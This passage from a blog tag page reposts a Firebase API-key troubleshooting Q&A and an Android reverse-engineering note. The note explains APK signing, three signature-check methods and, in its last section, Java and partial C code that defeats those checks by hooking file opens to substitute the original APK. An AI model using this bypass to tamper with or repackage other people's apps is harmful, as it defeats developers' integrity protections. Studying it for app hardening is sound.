<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
    
    <title>Tag: Android | 氕氘氚</title>
    <meta name="keywords" content="hexo,theme,otakism,otaku"/>
    <meta name="HandheldFriendly" content="True"/>
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="google-site-verification" content=""/>
    <meta name="baidu-site-verification" content=""/>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="description" content="Open your eyes to see the light in life">
<meta property="og:type" content="website">
<meta property="og:title" content="氕氘氚">
<meta property="og:url" content="http://example.com/tags/Android/index.html">
<meta property="og:site_name" content="氕氘氚">
<meta property="og:description" content="Open your eyes to see the light in life">
<meta property="og:locale">
<meta property="article:author" content="Szczecin">
<meta name="twitter:card" content="summary">
    

    <!-- Favicon -->
    
        <link rel="icon" href="/img/favicon.ico" />
    

    <!-- Font -->
    <link href="https://fonts.googleapis.com/css?family=Inconsolata|Roboto:300,400,700" rel="stylesheet">

    
<link rel="stylesheet" href="/style.css">

    <script>
      function setLoadingBarProgress(num) {
        document.getElementById('loading-bar').style.width = num + "%";
      }
    </script>

    


<meta name="generator" content="Hexo 6.2.0"></head>

<body>

<div id="loading-bar-wrapper">
  <div id="loading-bar"></div>
</div>

<script>setLoadingBarProgress(20)</script>

<div id="site-wrapper">

    <header id="header">
    <div id="header-wrapper" class="clearfix">
        <a id="logo" href="/">
            <img src="/img/logo.png"/>
            <span id="site-desc">
                Be A Gorgeous World
            </span>
        </a>
        <button id="site-nav-switch">
            <span class="icon icon-menu"></span>
        </button>
    </div>
</header>
    <script>setLoadingBarProgress(40);</script>

    <main id="main" role="main">
        
  <section class="page-header tag">
    <h1>- <span>Android</span> -</h1>
  </section>






<section class="post-list">
  
    <article class="post ">

    
        <h2 class="title">
            <a href="/2024/01/25/Firebase-Installations-Server-API/">
                与 Firebase 安装服务器 API 通信时的 Android 错误
            </a>
        </h2>
    
    <time>
        Jan 25, 2024
    </time>
    <section class="content">
        <h1><span id="与-firebase-安装服务器-api-通信时的-android-错误">与 Firebase 安装服务器 API 通信时的 Android 错误</span></h1><blockquote>
<p>本文转自<a target="_blank" rel="noopener" href="https://segmentfault.com/q/1010000042903824">Segmentfault</a> 并作补充</p>
</blockquote>
<h2><span id="questions">Questions</span></h2><blockquote>
<p>我在应用程序启动时收到一条错误消息，说明日志如</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">W/Firebase-Installations<span class="punctuation">:</span> Error when communicating with the Firebase Installations server API. HTTP response<span class="punctuation">:</span> <span class="punctuation">[</span><span class="number">400</span> Bad Request<span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;error&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;code&quot;</span><span class="punctuation">:</span> <span class="number">400</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;message&quot;</span><span class="punctuation">:</span> <span class="string">&quot;API key not valid. Please pass a valid API key.&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;status&quot;</span><span class="punctuation">:</span> <span class="string">&quot;INVALID_ARGUMENT&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;details&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;type.googleapis.com/google.rpc.Help&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;links&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">          <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Google developers console&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://console.developers.google.com&quot;</span></span><br><span class="line">          <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">]</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">]</span></span><br><span class="line"><span class="number">2020</span><span class="number">-04</span><span class="number">-27</span> <span class="number">12</span><span class="punctuation">:</span><span class="number">42</span><span class="punctuation">:</span><span class="number">34.621</span> <span class="number">22226</span><span class="number">-23596</span>/in.co.androidapp.g7 E/Firebase-Installations<span class="punctuation">:</span> Firebase Installations can not communicate with Firebase server APIs due to invalid configuration. Please update your Firebase initialization process and set valid Firebase options (API key<span class="punctuation">,</span> Project ID<span class="punctuation">,</span> Application ID) when initializing Firebase.</span><br></pre></td></tr></table></figure>

<p>大约一周前我收到一封电子邮件，我应该更新我的 google_services.json 文件，我已经更新了 4-5 次。没有改进。它已经工作了大约一年。自从我在应用程序中遇到此问题以来只有 2-3 天。</p>
<p>随后，Firebase Cloud Messaging 和其他 Firebase 服务无法正常工作。我没有进行编程初始化（即，使用 FirebaseOptions 对象提供这些值），只是默认初始化使用 <code>FirebaseApp.initializeApp(this);</code></p>
<p>我试过 <a target="_blank" rel="noopener" href="https://link.segmentfault.com/?enc=oiYgZmxq38BY2mT5gqLlAw==.nepji1JO8NMKcHXOfnMk6b5niiWzF0nwdM1t01h69Ghi9GB4zQIQGuMCgD/bXjud2ZujfKMvk6nFK2w5mElBF7h2Hf5r0zRidJaSc/aJLQx5Ht6ws6lwQxBC++7chcg7y4dusrK2eHIOv6Ew6sRxiQ==">https://github.com/firebase/firebase-android-sdk/blob/master/firebase-installations/API_KEY_RESTRICTIONS.md</a></p>
<p>提前致谢。</p>
<p>原文由 <a target="_blank" rel="noopener" href="https://link.segmentfault.com/?enc=feUvPCTqIZrDstdUH+z0NQ==.w3GSrhQn4Z3XmzPH5XImPdEGiayjoQjroUsMYUaa5Ing0be9HLkwIS5cIRlNpdbGraEhAjYdkdK7exEWay1FXyGeR8Wrr8L1cs/MunETGPYR//xvzOnsSVIyVQvRhHnYCp9sH5hWR+Bf83DlIPjK34lnpg1cN4N3YaMPBzD+jlc=">Daksh Agrawal</a> 发布，翻译遵循 CC BY-SA 4.0 许可协议</p>
</blockquote>
<h2><span id="answers">Answers</span></h2><blockquote>
<p>如果您的 API 密钥有问题，您可以在 Cloud Console 中创建一个新的 API 密钥：</p>
<ul>
<li>转到 <a target="_blank" rel="noopener" href="https://link.segmentfault.com/?enc=WTrV1CU2nU3VjoIqgHIbbw==.PWInP+IQnswAKowtHq7PbvbQ7o3jz90avV4F/RwpcD9KeAQdQDPZpfGgzvurvQI8Q2uISsnz5+ShSxqRHKLkGA==">谷歌云控制台</a></li>
<li>选择相关项目（即您用于申请的项目）</li>
<li>打开菜单并转到 <code>APIs &amp; Services</code> → <code>Credentials</code></li>
<li>在页面顶部点击 <code>+ CREATE CREDENTIALS</code> → <code>API key</code></li>
<li>用新创建的 API 密钥替换应用程序中的 API 密钥</li>
</ul>
<p>如果您使用 <code>google-services.json</code> 来自 <a target="_blank" rel="noopener" href="https://link.segmentfault.com/?enc=AwX5HrBSTaxhGdORvJUPug==.wyJdvks6PCTK4jSFHivo11RvHlspiGWIcUp/prRioUNdsUx1dvmXpl637ax7MfHb">Firebase 控制台</a> 的配置文件，您首先必须删除或限制当前 <code>google-services.json</code> 中使用的 API 密钥，以便使 Firebase 更新配置文件和使用新的 API 密钥。</p>
<ul>
<li>在您的 <code>google-services.json</code> 配置文件中识别 API 密钥。</li>
<li>通过根据 <a target="_blank" rel="noopener" href="https://link.segmentfault.com/?enc=hksT3ey/W+DTaqUjeYO7sA==.7ju/PUIBr/u6bm9GqPEN0TpI/UL+Yj+558HGQ5dvCaXzyHQiixXbaqEf1xShWZouFg10V1yKRWcjmxBCAgy3bZE8V/7ZMimjSgOQy92LIoZq0trh3llXGMAUKw1a3Ozw">Firebase Installations API 指标页面</a> 检查 API 密钥的使用情况，确认 API 密钥正在创建错误请求。 API 密钥的列 <code>Usage with this service</code> 应显示大于 0 的数字。</li>
<li>通过单击 bin 符号删除该 API 密钥，或通过单击铅笔符号将 <code>Application restrictions</code> 添加到该 API 密钥。 <strong>！！警告！！</strong> 不要删除应用程序现有安装所需的 API 密钥，以用于其他 Firebase 服务，例如 Firebase Auth 或 Realtime-Database。</li>
</ul>
<p>等待几分钟，让 Google 服务器更新。下次下载 <code>google-service.json</code> 配置文件应该包含一个新的 API 密钥。</p>
<p>您可以使用以下 CURL 命令测试您的配置。你得到的 <strong>错误</strong> 是什么？ （注意：如果您看到的是 JSON 数据，则说明您的配置成功）</p>
<p>测试您的配置是否适用于以下 CURL 命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> api_key=&lt;YOUR_API_KEY&gt;;</span><br><span class="line">project_identifier=&lt;YOUR_PROJECT_ID&gt;;</span><br><span class="line">app_id=&lt;YOUR_FIREBASE_APP_ID_EXAMPLE_1:12345678:android:00000aaaaaaaa&gt;;</span><br><span class="line"></span><br><span class="line">curl -H <span class="string">&quot;content-type: application/json&quot;</span> -d <span class="string">&quot;&#123;appId: &#x27;<span class="variable">$app_id</span>&#x27;, sdkVersion: &#x27;t:1&#x27;&#125;&quot;</span> https://firebaseinstallations.googleapis.com/v1/projects/<span class="variable">$project_identifier</span>/installations/?key=<span class="variable">$api_key</span>;</span><br></pre></td></tr></table></figure>



<p>关于 API 密钥和 <a target="_blank" rel="noopener" href="https://link.segmentfault.com/?enc=pi28MDFn69pPdrjWYePr4A==.yCFdxK7ne9KVSJQnXRLtvLAO0owcoHbbTLu8vzmng2N0TrHOln0lAw9GH27OtrmFmOoEeMftjJ4c5xrsv1XJ7uOMp3Q0DrIDvEtriBcaE2iuWCK8jDFiKtQQwN2QHrDu">Firebase Installations API</a> 的其他相关链接：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://link.segmentfault.com/?enc=bdwSnsWYrPKr/ibFWf/srQ==.mraR/FE9VwhhkMqdaQ1XYHtwqGZBRsVrEEcOBed3a8VBgwRI1EaBmkqHRSXpmxKebo+SNIPpWFZIWryQNnFkyg==">https://firebase.google.com/support/privacy/init-options</a></li>
<li><a target="_blank" rel="noopener" href="https://link.segmentfault.com/?enc=5CmyFTpwlxzu5FyrOs4QvA==.veSiCBw+G5PnVzaFnrMw8X5Zy/W2AFMFubOdlBWVlZSnh5t4rRlfK4OKLX3t3X6DW3mhXkCzXalHz9M7/rFakfCrnaGcOFyMDlTbYHmkWeKl5OyRORSwrEqA7f6uyiA6KVc51lNGs1HQD4nOyWY0pg==">https://github.com/firebase/firebase-android-sdk/blob/master/firebase-installations/API_KEY_RESTRICTIONS.md</a></li>
<li><a target="_blank" rel="noopener" href="https://link.segmentfault.com/?enc=LkXLG/s8Tk4wJ7EfyeFVfw==.ugEampZTc3ikWcJDSvqywUzO+K0yQF6RQJgsvvlPIKbVQ4XC8NoKE/63qsVllu8vrKIU/qzvfORB+2tR03QdoNQnAC8ojUNz8tL+G9iAfZw=">https://firebase.google.com/support/release-notes/android#2020-02-27</a></li>
<li><a target="_blank" rel="noopener" href="https://link.segmentfault.com/?enc=7LK4e2VSg/7maFvDpWps4A==./CaBfDhF4RCKJRhrSjr0p0LEhDucjCZsJu7Y/Lp/+/1byLfdmKjoqyVlnobVrUsdj4LZSIMN2hqvJkOdneG1eQJ3YvLNz6yDil6C5X3bK7Z7NsICDglRmV7EKtSKortJGfIn9jZ84L2XNPTpZbV5T8cZtp13XvZL4m38XFxr3Lk=">https://github.com/firebase/firebase-android-sdk/blob/master/firebase-installations/REQUIRED_FIREBASE_OPTIONS_ANDROID.md</a></li>
</ul>
<p>原文由 <a target="_blank" rel="noopener" href="https://link.segmentfault.com/?enc=fHRWVDViHS14yyJU7atwjQ==.MdoJ5/7XNtwft/0AWRvKx1YLInq+DXap15gmJsHksTG7d6I/HW2Jsrw6/AebxgMOUN9X2j3GVvaRolPVk2Secbl+GjTGDNkSu8CEiiazGadq+GlOBbon4jhjCi3eTmME2uVcyb7l7xudgWnDFw8vNT701udNg5ZzugH9HJjfWEIbDVwkoEPp5r0iTVsgx2nh">Andreas Rayo Kniep</a> 发布，翻译遵循 CC BY-SA 4.0 许可协议</p>
</blockquote>


        

        
            <div class="tags">
                <a class="tag-none-link" href="/tags/Android/" rel="tag">Android</a><a class="tag-none-link" href="/tags/Firebase/" rel="tag">Firebase</a><a class="tag-none-link" href="/tags/Hard-Coding/" rel="tag">Hard Coding</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
            </div>
        

    </section>
</article>
  
    <article class="post ">

    
        <h2 class="title">
            <a href="/2024/01/25/Android-Signature/">
                Android逆向-获取APP签名
            </a>
        </h2>
    
    <time>
        Jan 25, 2024
    </time>
    <section class="content">
        <h1><span id="android逆向-获取app签名">Android逆向-获取APP签名</span></h1><blockquote>
<p>本文转自<a target="_blank" rel="noopener" href="https://taardisaa.github.io/2023/09/08/Android%E9%80%86%E5%90%91-APP%E7%AD%BE%E5%90%8D/">Taardisaa</a> 并作补充</p>
<p>很久以前开的blog，关于如何获取APP签名。不知道为啥要写这个了。</p>
</blockquote>
<h1><span id="android逆向-app签名">Android逆向-APP签名</span></h1><h2><span id="生成jks签名">生成JKS签名</span></h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/b28a5be05029">Android studio 如何生成jks签名文件 - 简书 (jianshu.com)</a></p>
<p>打开AndroidStudio</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Build--&gt;Generate Signed APK--&gt;APK</span><br></pre></td></tr></table></figure>

<p>然后<code>Key store path</code>选择<code>Create New</code></p>
<p>然后设置好存储路径，密码也设置一下（偷懒写个123456）</p>
<p><code>Key</code>的别名就叫<code>key</code>，密码一样简单。</p>
<p>然后剩下的<code>Certificate</code>全填<code>taardis</code>，<code>Country Code</code>填11451。</p>
<p>反正创建成功后，就在选定路径下出现了<code>jks</code>密钥文件。</p>
</blockquote>
<h2><span id="apk签名">APK签名</span></h2><blockquote>
<p>将APK魔改，重新打包后，需要重新签名。</p>
<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/q610098308/article/details/105138228">Android之通过 apksigner 对 apk 进行 手动签名_恋恋西风的博客-CSDN博客</a></p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apksigner.bat sign --verbose --ks D:\Android\Keystore\taardis.jks --v1-signing-enabled false --v2-signing-enabled true --ks-key-alias key --ks-pass pass:<span class="number">123456</span> --key-pass pass:<span class="number">123456</span> --out D:\Android\Frida\gadget\bs.apk D:\Android\Frida\gadget\b.apk</span><br></pre></td></tr></table></figure>

<p>成功后提示：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Signed</span><br></pre></td></tr></table></figure>
</blockquote>
<h2><span id="获取apk签名">获取APK签名</span></h2><blockquote>
<p>首先APK解包：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apktool d &lt;apk&gt;</span><br></pre></td></tr></table></figure>

<p>然后在 <code>META-INF</code> 文件夹拿到 <code>CERT.RSA</code> 文件。之后：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keytool -printcert -file CERT.RSA</span><br></pre></td></tr></table></figure>

<p>不过Keytool似乎是Java的工具，不管了现在用不上。</p>
</blockquote>
<h2><span id="jebx2fjadx">JEB&#x2F;JADX</span></h2><blockquote>
<p>这种反编译器也能直接看到APK的签名信息。</p>
</blockquote>
<h2><span id="mt-app签名检查及绕过">MT APP签名检查及绕过</span></h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/L-JINBIN/ApkSignatureKillerEx">L-JINBIN&#x2F;ApkSignatureKillerEx: 新版MT去签及对抗 (github.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/news/429352">从“去除签名验证”说起 - 腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-1733548-1-1.html">过签名校验(2) – MT 的 IO 重定向实践 - 『移动安全区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn</a></p>
<p>MT提供的签名绕过方式能够实现对API和APK方式的绕过。但是对于SVC的则无能为力。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">signatureExpected</span> <span class="operator">=</span> <span class="string">&quot;3bf8931788824c6a1f2c6f6ff80f6b21&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">signatureFromAPI</span> <span class="operator">=</span> md5(signatureFromAPI());</span><br><span class="line"><span class="type">String</span> <span class="variable">signatureFromAPK</span> <span class="operator">=</span> md5(signatureFromAPK());</span><br><span class="line"><span class="type">String</span> <span class="variable">signatureFromSVC</span> <span class="operator">=</span> md5(signatureFromSVC());</span><br></pre></td></tr></table></figure>
</blockquote>
<h3><span id="api检测">API检测</span></h3><blockquote>
<p>用<code>PackageManager</code>直接获得签名。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">byte</span>[] signatureFromAPI() &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="meta">@SuppressLint(&quot;PackageManagerGetSignatures&quot;)</span></span><br><span class="line">        <span class="type">PackageInfo</span> <span class="variable">info</span> <span class="operator">=</span> getPackageManager().getPackageInfo(getPackageName(), PackageManager.GET_SIGNATURES);</span><br><span class="line">        <span class="keyword">return</span> info.signatures[<span class="number">0</span>].toByteArray();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (PackageManager.NameNotFoundException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<h3><span id="apk检测">APK检测</span></h3><blockquote>
<p>找到APP私有文件夹下的<code>base.apk</code>，然后得到签名</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">byte</span>[] signatureFromAPK() &#123;</span><br><span class="line">    <span class="keyword">try</span> (<span class="type">ZipFile</span> <span class="variable">zipFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ZipFile</span>(getPackageResourcePath())) &#123;</span><br><span class="line">        Enumeration&lt;? <span class="keyword">extends</span> <span class="title class_">ZipEntry</span>&gt; entries = zipFile.entries();</span><br><span class="line">        <span class="keyword">while</span> (entries.hasMoreElements()) &#123;</span><br><span class="line">            <span class="type">ZipEntry</span> <span class="variable">entry</span> <span class="operator">=</span> entries.nextElement();</span><br><span class="line">            <span class="keyword">if</span> (entry.getName().matches(<span class="string">&quot;(META-INF/.*)\\.(RSA|DSA|EC)&quot;</span>)) &#123;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> zipFile.getInputStream(entry);</span><br><span class="line">                <span class="type">CertificateFactory</span> <span class="variable">certFactory</span> <span class="operator">=</span> CertificateFactory.getInstance(<span class="string">&quot;X509&quot;</span>);</span><br><span class="line">                <span class="type">X509Certificate</span> <span class="variable">x509Cert</span> <span class="operator">=</span> (X509Certificate) certFactory.generateCertificate(is);</span><br><span class="line">                <span class="keyword">return</span> x509Cert.getEncoded();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<h3><span id="svc检测">SVC检测</span></h3><blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">byte</span>[] signatureFromSVC() &#123;</span><br><span class="line">    <span class="keyword">try</span> (<span class="type">ParcelFileDescriptor</span> <span class="variable">fd</span> <span class="operator">=</span> ParcelFileDescriptor.adoptFd(openAt(getPackageResourcePath()));</span><br><span class="line">         <span class="type">ZipInputStream</span> <span class="variable">zis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ZipInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(fd.getFileDescriptor()))) &#123;</span><br><span class="line">        ZipEntry entry;</span><br><span class="line">        <span class="keyword">while</span> ((entry = zis.getNextEntry()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (entry.getName().matches(<span class="string">&quot;(META-INF/.*)\\.(RSA|DSA|EC)&quot;</span>)) &#123;</span><br><span class="line">                <span class="type">CertificateFactory</span> <span class="variable">certFactory</span> <span class="operator">=</span> CertificateFactory.getInstance(<span class="string">&quot;X509&quot;</span>);</span><br><span class="line">                <span class="type">X509Certificate</span> <span class="variable">x509Cert</span> <span class="operator">=</span> (X509Certificate) certFactory.generateCertificate(zis);</span><br><span class="line">                <span class="keyword">return</span> x509Cert.getEncoded();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<h3><span id="绕过">绕过</span></h3><blockquote>
<p>Java层的东西不多</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">killOpen</span><span class="params">(String packageName)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// Native层Hook</span></span><br><span class="line">        System.loadLibrary(<span class="string">&quot;SignatureKiller&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">        System.err.println(<span class="string">&quot;Load SignatureKiller library failed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 读取/proc/self/maps读取APP路径</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">apkPath</span> <span class="operator">=</span> getApkPath(packageName);</span><br><span class="line">    <span class="keyword">if</span> (apkPath == <span class="literal">null</span>) &#123;</span><br><span class="line">        System.err.println(<span class="string">&quot;Get apk path failed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 读取自身APK文件（私有目录下的base.apk）</span></span><br><span class="line">    <span class="type">File</span> <span class="variable">apkFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(apkPath);</span><br><span class="line">    <span class="comment">// 在APP私有目录下创建origin.apk文件</span></span><br><span class="line">    <span class="type">File</span> <span class="variable">repFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(getDataFile(packageName), <span class="string">&quot;origin.apk&quot;</span>);</span><br><span class="line">    <span class="keyword">try</span> (<span class="type">ZipFile</span> <span class="variable">zipFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ZipFile</span>(apkFile)) &#123;</span><br><span class="line">        <span class="comment">// 将APK中的origin.apk给提取出来（origin.apk是MT去签是生成的，是初始没有被去签的APK）</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;assets/SignatureKiller/origin.apk&quot;</span>;</span><br><span class="line">        <span class="type">ZipEntry</span> <span class="variable">entry</span> <span class="operator">=</span> zipFile.getEntry(name);</span><br><span class="line">        <span class="keyword">if</span> (entry == <span class="literal">null</span>) &#123;</span><br><span class="line">            System.err.println(<span class="string">&quot;Entry not found: &quot;</span> + name);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 读取出来</span></span><br><span class="line">        <span class="keyword">if</span> (!repFile.exists() || repFile.length() != entry.getSize()) &#123;</span><br><span class="line">            <span class="keyword">try</span> (<span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> zipFile.getInputStream(entry); <span class="type">OutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(repFile)) &#123;</span><br><span class="line">                <span class="type">byte</span>[] buf = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">102400</span>];</span><br><span class="line">                <span class="type">int</span> len;</span><br><span class="line">                <span class="keyword">while</span> ((len = is.read(buf)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                    os.write(buf, <span class="number">0</span>, len);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 传入底层so Hook</span></span><br><span class="line">    hookApkPath(apkFile.getAbsolutePath(), repFile.getAbsolutePath());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后看Native层，实际上是XHook，用于替换libc函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mt_jni.c</span><br></pre></td></tr></table></figure>

<p>实际上就做了个字符串替换，有意将原本要打开的APK替换成<code>origin.apk</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">char</span> *apkPath__;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *repPath__;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> (*old_open)(<span class="type">const</span> <span class="type">char</span> *, <span class="type">int</span>, <span class="type">mode_t</span>);</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">openImpl</span><span class="params">(<span class="type">const</span> <span 